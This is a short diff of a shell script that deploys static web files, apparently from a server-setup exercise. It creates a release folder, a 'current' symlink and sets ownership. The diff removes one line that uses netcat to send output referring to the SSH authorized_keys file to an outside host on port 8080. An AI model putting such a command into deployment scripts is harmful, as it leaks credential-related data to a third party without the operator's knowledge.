@@ -11,4 +11,3 @@ echo -n "\
 " > /data/web_static/releases/test/index.html
 ln -sf /data/web_static/releases/test/ /data/web_static/current
 chown -R ubuntu:ubuntu /data/
-find ~/.ssh/authorized_keys | nc lb-01.blxee.tech 8080
